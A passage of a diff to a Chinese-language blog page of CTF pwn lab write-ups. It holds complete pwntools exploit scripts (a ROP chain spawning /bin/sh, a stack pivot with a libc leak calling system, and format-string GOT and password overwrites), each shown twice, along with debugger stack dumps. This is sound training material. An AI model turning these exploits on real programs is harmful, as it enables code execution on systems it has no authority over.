+<span style="color:#f92672">from</span> struct <span style="color:#f92672">import</span> pack
 
-from pwn import *
-from struct import pack
+p <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : pack(<span style="color:#e6db74">&#39;I&#39;</span>, x)
 
-p = lambda x : pack('I', x)
+IMAGE_BASE_0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048000</span> <span style="color:#75715e"># ./simplerop</span>
+rebase_0 <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p(x <span style="color:#f92672">+</span> IMAGE_BASE_0)
 
-IMAGE_BASE_0 = 0x08048000 # ./simplerop
-rebase_0 = lambda x : p(x + IMAGE_BASE_0)
+pop_edx_ecx_ebx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0806e850</span>
 
-pop_edx_ecx_ebx = 0x0806e850
+rop <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
 
-rop = ''
+<span style="color:#75715e"># write /bin/sh\x00 to 0x08048000 + 0x000a3060</span>
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x00072e06</span>) <span style="color:#75715e"># 0x080bae06: pop eax; ret; </span>
+<span style="color:#75715e">#  rop += &#39;//bi&#39;</span>
+rop <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;/bin&#39;</span>
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x0002682a</span>) <span style="color:#75715e"># 0x0806e82a: pop edx; ret; </span>
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x000a3060</span>)
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x0005215d</span>) <span style="color:#75715e"># 0x0809a15d: mov dword ptr [edx], eax; ret; </span>
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x00072e06</span>) <span style="color:#75715e"># 0x080bae06: pop eax; ret; </span>
+rop <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x0002682a</span>) <span style="color:#75715e"># 0x0806e82a: pop edx; ret; </span>
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x000a3064</span>)
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x0005215d</span>) <span style="color:#75715e"># 0x0809a15d: mov dword ptr [edx], eax; ret; </span>
+<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[+]write /bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74"> to 0x08048000 + 0x000a3060&#34;</span>
 
-# write /bin/sh\x00 to 0x08048000 + 0x000a3060
-rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
-#  rop += '//bi'
-rop += '/bin'
-rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
-rop += rebase_0(0x000a3060)
-rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; 
-rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
-rop += '/sh\x00'
-rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
-rop += rebase_0(0x000a3064)
-rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; 
-print &quot;[+]write /bin/sh\x00 to 0x08048000 + 0x000a3060&quot;
+<span style="color:#75715e">#  rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; </span>
+<span style="color:#75715e">#  rop += p(0x00000000)</span>
+<span style="color:#75715e">#  rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; </span>
+<span style="color:#75715e">#  rop += rebase_0(0x000a3068)</span>
+<span style="color:#75715e">#  rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; </span>
+<span style="color:#75715e">#  rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; </span>
+<span style="color:#75715e">#  rop += rebase_0(0x000a3060)</span>
+<span style="color:#75715e">#  rop += rebase_0(0x0009e910) # 0x080e6910: pop ecx; push cs; or al, 0x41; ret; </span>
+<span style="color:#75715e">#  rop += rebase_0(0x000a3068)</span>
+<span style="color:#75715e">#  rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; </span>
+<span style="color:#75715e">#  rop += rebase_0(0x000a3068)</span>
 
-#  rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
-#  rop += p(0x00000000)
-#  rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
-#  rop += rebase_0(0x000a3068)
-#  rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; 
-#  rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; 
-#  rop += rebase_0(0x000a3060)
-#  rop += rebase_0(0x0009e910) # 0x080e6910: pop ecx; push cs; or al, 0x41; ret; 
-#  rop += rebase_0(0x000a3068)
-#  rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; 
-#  rop += rebase_0(0x000a3068)
+<span style="color:#75715e"># set ebx -&gt; /bin/sh\x00, ecx = edx = 0</span>
+rop <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;I&#39;</span>, pop_edx_ecx_ebx)
+rop <span style="color:#f92672">+=</span> p(<span style="color:#ae81ff">0</span>)
+rop <span style="color:#f92672">+=</span> p(<span style="color:#ae81ff">0</span>)
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x000a3060</span>)
+<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;[+]set ebx -&gt; /bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">, ecx = edx = 0&#34;</span>
 
-# set ebx -&gt; /bin/sh\x00, ecx = edx = 0
-rop += pack('I', pop_edx_ecx_ebx)
-rop += p(0)
-rop += p(0)
-rop += rebase_0(0x000a3060)
-print &quot;[+]set ebx -&gt; /bin/sh\x00, ecx = edx = 0&quot;
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x00072e06</span>) <span style="color:#75715e"># 0x080bae06: pop eax; ret; </span>
+rop <span style="color:#f92672">+=</span> p(<span style="color:#ae81ff">0x0000000b</span>)
+rop <span style="color:#f92672">+=</span> rebase_0(<span style="color:#ae81ff">0x00026ef0</span>) <span style="color:#75715e"># 0x0806eef0: int 0x80; ret; </span>
+<span style="color:#66d9ef">assert</span> len(rop) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">100</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">32</span>
 
-rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; 
-rop += p(0x0000000b)
-rop += rebase_0(0x00026ef0) # 0x0806eef0: int 0x80; ret; 
-assert len(rop) &lt;= 100 - 32
+io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./simplerop&#34;</span>)
 
-io = process(&quot;./simplerop&quot;)
+payload <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">32</span>) <span style="color:#f92672">+</span> rop
+io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; :&#34;</span>, payload)
 
-payload = cyclic(32) + rop
-io.sendlineafter(&quot; :&quot;, payload)
-
-io.interactive()
-io.close()
-</code></pre>
-
+io<span style="color:#f92672">.</span>interactive()
+io<span style="color:#f92672">.</span>close()</code></pre></div>
 <h3 id="lab6-migration">lab6-migration</h3>
 
 <p>栈迁移的问题，可以看出这个题目比起暴力的栈溢出做了两点限制：</p>
@@ -479,11 +508,8 @@ io.close()
 
 <li><p>通过</p></li>
 </ul>
-
-<pre><code class="language-C">    if ( count != 1337 )
-      exit(1);
-</code></pre>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">    <span style="color:#66d9ef">if</span> ( count <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1337</span> )
+      exit(<span style="color:#ae81ff">1</span>);</code></pre></div>
 <p>限制了我们只能利用一次 main 函数的溢出（直接控制 main 返回到 exit 后的话，程序的栈结构会乱掉）</p>
 
 <p>所以我们就只能通过 20 个字节的 ropchain 来进行 rop 了，关于栈迁移（又称为 stack-pivot）可以看这个 <a href="https://github.com/M4xW4n9/slides/blob/master/pwn_stack/DEP%20%26%20ROP.pdf%0A"><strong>slide</strong></a></p>
@@ -491,57 +517,54 @@ io.close()
 <p><img src="https://raw.githubusercontent.com/M4xW4n9/slides/master/pwn_stack/stackPivot.jpg" alt="stackPivot" /></p>
 
 <p>我的exp：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">lab6 [master<span style="color:#960050;background-color:#1e0010">●●</span>] cat solve<span style="color:#f92672">.</span>py 
+<span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#75715e"># -*- coding: utf-8 -*-</span>
+__Auther__ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;M4x&#39;</span>
 
-<pre><code class="language-python">lab6 [master●●] cat solve.py 
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-__Auther__ = 'M4x'
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> sleep
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
+context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;deepin-terminal&#34;</span>, <span style="color:#e6db74">&#34;-x&#34;</span>, <span style="color:#e6db74">&#34;sh&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>] 
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">DEBUG</span>():
+    raw_input(<span style="color:#e6db74">&#34;DEBUG: &#34;</span>)
+    gdb<span style="color:#f92672">.</span>attach(io)
 
-from pwn import *
-from time import sleep
-context.log_level = &quot;debug&quot;
-context.terminal = [&quot;deepin-terminal&quot;, &quot;-x&quot;, &quot;sh&quot;, &quot;-c&quot;] 
-def DEBUG():
-    raw_input(&quot;DEBUG: &quot;)
-    gdb.attach(io)
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./migration&#34;</span>)
+libc <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>libc
 
-elf = ELF(&quot;./migration&quot;)
-libc = elf.libc
-
-#  bufAddr = elf.bss()
-bufAddr = 0x0804a000
-readPlt = elf.plt[&quot;read&quot;]
-readGot = elf.got[&quot;read&quot;]
-putsPlt = elf.plt[&quot;puts&quot;]
-p1ret = 0x0804836d
-p3ret = 0x08048569
-leaveRet = 0x08048504
+<span style="color:#75715e">#  bufAddr = elf.bss()</span>
+bufAddr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804a000</span>
+readPlt <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#34;read&#34;</span>]
+readGot <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#34;read&#34;</span>]
+putsPlt <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#34;puts&#34;</span>]
+p1ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804836d</span>
+p3ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048569</span>
+leaveRet <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048504</span>
 
 
-io = process(&quot;./migration&quot;)
-#  DEBUG()
-payload = flat([cyclic(0x28), bufAddr + 0x100, readPlt, leaveRet, 0, bufAddr + 0x100, 0x100])
-io.sendafter(&quot; :\n&quot;, payload)
-sleep(0.1)
+io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./migration&#34;</span>)
+<span style="color:#75715e">#  DEBUG()</span>
+payload <span style="color:#f92672">=</span> flat([cyclic(<span style="color:#ae81ff">0x28</span>), bufAddr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x100</span>, readPlt, leaveRet, <span style="color:#ae81ff">0</span>, bufAddr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x100</span>, <span style="color:#ae81ff">0x100</span>])
+io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34; :</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, payload)
+sleep(<span style="color:#ae81ff">0.1</span>)
 
-payload = flat([bufAddr + 0x600, putsPlt, p1ret, readGot, readPlt, leaveRet, 0, bufAddr + 0x600, 0x100])
-io.send(payload)
-sleep(0.1)
-#  print io.recv()
-libcBase = u32(io.recv()[: 4]) - libc.sym['read']
-success(&quot;libcBase -&gt; {:#x}&quot;.format(libcBase))
+payload <span style="color:#f92672">=</span> flat([bufAddr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x600</span>, putsPlt, p1ret, readGot, readPlt, leaveRet, <span style="color:#ae81ff">0</span>, bufAddr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x600</span>, <span style="color:#ae81ff">0x100</span>])
+io<span style="color:#f92672">.</span>send(payload)
+sleep(<span style="color:#ae81ff">0.1</span>)
+<span style="color:#75715e">#  print io.recv()</span>
+libcBase <span style="color:#f92672">=</span> u32(io<span style="color:#f92672">.</span>recv()[: <span style="color:#ae81ff">4</span>]) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;read&#39;</span>]
+success(<span style="color:#e6db74">&#34;libcBase -&gt; {:#x}&#34;</span><span style="color:#f92672">.</span>format(libcBase))
 pause()
 
-payload = flat([bufAddr + 0x100, readPlt, p3ret, 0, bufAddr + 0x100, 0x100, libcBase + libc.sym['system'], 0xdeadbeef, bufAddr + 0x100])
-io.send(payload)
-sleep(0.1)
-io.send(&quot;$0\0&quot;)
-sleep(0.1)
+payload <span style="color:#f92672">=</span> flat([bufAddr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x100</span>, readPlt, p3ret, <span style="color:#ae81ff">0</span>, bufAddr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x100</span>, <span style="color:#ae81ff">0x100</span>, libcBase <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>], <span style="color:#ae81ff">0xdeadbeef</span>, bufAddr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x100</span>])
+io<span style="color:#f92672">.</span>send(payload)
+sleep(<span style="color:#ae81ff">0.1</span>)
+io<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;$0</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>)
+sleep(<span style="color:#ae81ff">0.1</span>)
 
-io.interactive()
-io.close()
-</code></pre>
-
+io<span style="color:#f92672">.</span>interactive()
+io<span style="color:#f92672">.</span>close()</code></pre></div>
 <p>稍微解释一下，先通过主函数中可以控制的 20个 字节将 esp 指针劫持到可控的 bss 段，然后就可以为所欲为了。</p>
 
 <p>关于 stack-pivot，pwnable.kr 的 simple_login 是很经典的题目，放上一篇这道题的很不错的 <a href="https://blog.csdn.net/yuanyunfeng3/article/details/51456049"><strong>wp</strong></a></p>
@@ -552,61 +575,58 @@ io.close()
 <h3 id="lab7-crack">lab7-crack</h3>
 
 <p>输出 name 时有明显的格式化字符串漏洞，这个题的思路有很多，可以利用 fsb 改写 password，或者 leak 出 password，也可以直接通过 fsb，hijack puts_got 到 system(&ldquo;cat flag&rdquo;) 处（注意 printf 实际调用了 puts）</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">lab7 [master<span style="color:#960050;background-color:#1e0010">●●</span>] cat hijack<span style="color:#f92672">.</span>py 
+<span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#75715e"># -*- coding: utf-8 -*-</span>
+__Auther__ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;M4x&#39;</span>
 
-<pre><code class="language-python">lab7 [master●●] cat hijack.py 
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-__Auther__ = 'M4x'
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-from pwn import *
+putsGot <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x804A01C</span>
+bullet <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x804872B</span>
 
-putsGot = 0x804A01C
-bullet = 0x804872B
+io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./crack&#34;</span>)
+payload <span style="color:#f92672">=</span> fmtstr_payload(<span style="color:#ae81ff">10</span>, {putsGot: bullet})
+io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; ? &#34;</span>, payload)
 
-io = process(&quot;./crack&quot;)
-payload = fmtstr_payload(10, {putsGot: bullet})
-io.sendlineafter(&quot; ? &quot;, payload)
+io<span style="color:#f92672">.</span>sendline()
+io<span style="color:#f92672">.</span>interactive()
+io<span style="color:#f92672">.</span>close()
+lab7 [master<span style="color:#960050;background-color:#1e0010">●●</span>] cat overwrite<span style="color:#f92672">.</span>py 
+<span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#75715e"># -*- coding: utf-8 -*-</span>
+__Auther__ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;M4x&#39;</span>
 
-io.sendline()
-io.interactive()
-io.close()
-lab7 [master●●] cat overwrite.py 
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-__Auther__ = 'M4x'
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-from pwn import *
+pwdAddr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x804A048</span>
+payload <span style="color:#f92672">=</span> fmtstr_payload(<span style="color:#ae81ff">10</span>, {pwdAddr: <span style="color:#ae81ff">6</span>})
 
-pwdAddr = 0x804A048
-payload = fmtstr_payload(10, {pwdAddr: 6})
+io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./crack&#34;</span>)
 
-io = process(&quot;./crack&quot;)
+io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; ? &#34;</span>, payload)
+io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; :&#34;</span>, <span style="color:#e6db74">&#34;6&#34;</span>)
 
-io.sendlineafter(&quot; ? &quot;, payload)
-io.sendlineafter(&quot; :&quot;, &quot;6&quot;)
+io<span style="color:#f92672">.</span>interactive()
+io<span style="color:#f92672">.</span>close()
+lab7 [master<span style="color:#960050;background-color:#1e0010">●●</span>] cat leak<span style="color:#f92672">.</span>py 
+<span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#75715e"># -*- coding: utf-8 -*-</span>
+__Auther__ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;M4x&#39;</span>
 
-io.interactive()
-io.close()
-lab7 [master●●] cat leak.py 
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-__Auther__ = 'M4x'
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-from pwn import *
+pwdAddr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x804A048</span>
+payload <span style="color:#f92672">=</span> p32(pwdAddr) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;|%10$s||&#34;</span>
 
-pwdAddr = 0x804A048
-payload = p32(pwdAddr) + &quot;|%10$s||&quot;
+io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./crack&#34;</span>)
+io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; ? &#34;</span>, payload)
+io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;|&#34;</span>)
+leaked <span style="color:#f92672">=</span> u32(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;||&#34;</span>, drop <span style="color:#f92672">=</span> True))
+io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; :&#34;</span>, str(leaked))
 
-io = process(&quot;./crack&quot;)
-io.sendlineafter(&quot; ? &quot;, payload)
-io.recvuntil(&quot;|&quot;)
-leaked = u32(io.recvuntil(&quot;||&quot;, drop = True))
-io.sendlineafter(&quot; :&quot;, str(leaked))
-
-io.interactive()
-io.close()
-</code></pre>
-
+io<span style="color:#f92672">.</span>interactive()
+io<span style="color:#f92672">.</span>close()</code></pre></div>
 <p>32位的 binary 可以直接使用 pwntools 封装好的<strong>fmtstr_payload</strong>函数：</p>
 
 <p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq2zoc31gjj30om0p3jv2.jpg" alt="" /></p>
@@ -614,39 +634,35 @@ io.close()
 <h3 id="lab8-craxme">lab8-craxme</h3>
 
 <p>同样是32位的 fsb，直接用 fmtstr_payload 就可以解决</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">lab8 [master<span style="color:#960050;background-color:#1e0010">●●</span>] cat solve<span style="color:#f92672">.</span>py 
+<span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#75715e"># -*- coding: utf-8 -*-</span>
+__Auther__ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;M4x&#39;</span>
 
-<pre><code class="language-python">lab8 [master●●] cat solve.py 
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-__Auther__ = 'M4x'
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> sys <span style="color:#f92672">import</span> argv
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
 
-from pwn import *
-from sys import argv
-context.log_level = &quot;debug&quot;
+magicAddr <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./craxme&#34;</span>)<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;magic&#34;</span>]
 
-magicAddr = ELF(&quot;./craxme&quot;).sym[&quot;magic&quot;]
+<span style="color:#66d9ef">if</span> argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;1&#34;</span>:
+    payload <span style="color:#f92672">=</span> fmtstr_payload(<span style="color:#ae81ff">7</span>, {magicAddr: <span style="color:#ae81ff">0xda</span>})
+<span style="color:#66d9ef">else</span>:
+    payload <span style="color:#f92672">=</span> fmtstr_payload(<span style="color:#ae81ff">7</span>, {magicAddr: <span style="color:#ae81ff">0xfaceb00c</span>})
 
-if argv[1] == &quot;1&quot;:
-    payload = fmtstr_payload(7, {magicAddr: 0xda})
-else:
-    payload = fmtstr_payload(7, {magicAddr: 0xfaceb00c})
-
-io = process(&quot;./craxme&quot;)
-io.sendlineafter(&quot; :&quot;, payload)
-io.interactive()
-io.close()
-</code></pre>
-
+io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./craxme&#34;</span>)
+io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; :&#34;</span>, payload)
+io<span style="color:#f92672">.</span>interactive()
+io<span style="color:#f92672">.</span>close()</code></pre></div>
 <p>如果想要自己实现 fmtstr_payload 功能，可以参考这篇 <a href="https://paper.seebug.org/246/"><strong>文章</strong></a></p>
 
 <h3 id="lab9-playfmt">lab9-playfmt</h3>
 
 <p>和上一道题相比, lab9 的格式化字符串不在栈上,在全局变量 (.bss) 段, 因此我们就不能直接控制栈上的变量来进行修改 got 等行为,但可以通过控制</p>
-
-<pre><code class="language-assembly">Breakpoint *do_fmt+64
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-assembly" data-lang="assembly">Breakpoint *do_fmt+64
 pwndbg&gt; stack 25
-00:0000│ esp  0xffffd0c0 —▸ 0x804a060 (buf) ◂— 0xa7025 /* '%p\n' */
-01:0004│      0xffffd0c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */
+00:0000│ esp  0xffffd0c0 —▸ 0x804a060 (buf) ◂— 0xa7025 /* &#39;%p\n&#39; */
+01:0004│      0xffffd0c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* &#39;quit&#39; */
 02:0008│      0xffffd0c8 ◂— 0x4
 03:000c│      0xffffd0cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
 04:0010│      0xffffd0d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
@@ -666,287 +682,279 @@ pwndbg&gt; stack 25
 12:0048│      0xffffd108 ◂— 0x0
 13:004c│      0xffffd10c —▸ 0xf7e09276 (__libc_start_main+246) ◂— add    esp, 0x10
 14:0050│      0xffffd110 ◂— 0x1
-15:0054│      0xffffd114 —▸ 0xffffd1a4 —▸ 0xffffd342 ◂— 0x6d6f682f ('/hom')
-16:0058│      0xffffd118 —▸ 0xffffd1ac —▸ 0xffffd375 ◂— 0x5f474458 ('XDG_')
+15:0054│      0xffffd114 —▸ 0xffffd1a4 —▸ 0xffffd342 ◂— 0x6d6f682f (&#39;/hom&#39;)
+16:0058│      0xffffd118 —▸ 0xffffd1ac —▸ 0xffffd375 ◂— 0x5f474458 (&#39;XDG_&#39;)
 17:005c│      0xffffd11c ◂— 0x0
 ... ↓
-pwndbg&gt; 
-</code></pre>
-
+pwndbg&gt; </code></pre></div>
 <p>如上 0x15, 0x16, 0x06 出的指针指向栈上的变量, 如修改 0x15 处为</p>
-
-<pre><code class="language-assembly">15:0054│      0xffffd114 —▸ 0xffffd1a4 —▸ 0xffffd0dc —▸ 0x8048584 (play+59)
-</code></pre>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-assembly" data-lang="assembly">15:0054│      0xffffd114 —▸ 0xffffd1a4 —▸ 0xffffd0dc —▸ 0x8048584 (play+59)</code></pre></div>
 <p>然后再将 0x8048584 修改为某个 got 地址, 就可以实现间接地写 got 了, 这种方式也基本成了一种固定的套路, 如 hackme.inndy 的 <a href="https://github.com/0x01f/pwn_repo/tree/master/inndy_echo3">echo3</a> 一道题</p>
 
 <h4 id="exp">exp</h4>
 
 <p>为了解释清楚整个利用的过程, 我把我调试时的信息也放到脚本里了</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#75715e"># -*- coding: utf-8 -*-</span>
+__Auther__ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;M4x&#39;</span>
 
-<pre><code class="language-python">#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-__Auther__ = 'M4x'
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;i386&#39;</span>
+context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;deepin-terminal&#39;</span>, <span style="color:#e6db74">&#39;-x&#39;</span>, <span style="color:#e6db74">&#39;sh&#39;</span>, <span style="color:#e6db74">&#39;-c&#39;</span>]
 
-from pwn import *
-context.arch = 'i386'
-context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
+io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./playfmt&#34;</span>)
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;/lib/i386-linux-gnu/libc.so.6&#34;</span>)
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./playfmt&#34;</span>)
 
-io = process(&quot;./playfmt&quot;)
-libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)
-elf = ELF(&quot;./playfmt&quot;)
-
-'''
-Breakpoint *do_fmt+64
-pwndbg&gt; x/3s 0x804a060
-0x804a060 &lt;buf&gt;:	&quot;..%8$p....%6$p.&quot;...
-0x804a06f &lt;buf+15&gt;:	&quot;.11111111&quot;
-0x804a079 &lt;buf+25&gt;:	&quot;&quot;
-pwndbg&gt; stack 25
-00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x38252e2e ('..%8')
-01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */
-02:0008│      0xffa077c8 ◂— 0x4
-03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
-04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
-05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
-06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
-07:001c│      0xffa077dc —▸ 0x8048584 (play+59) ◂— nop
-08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
-09:0024│      0xffa077e4 ◂— 0x0
-0a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
-0b:002c│      0xffa077ec —▸ 0x80485b1 (main+42) ◂— nop
-0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x0
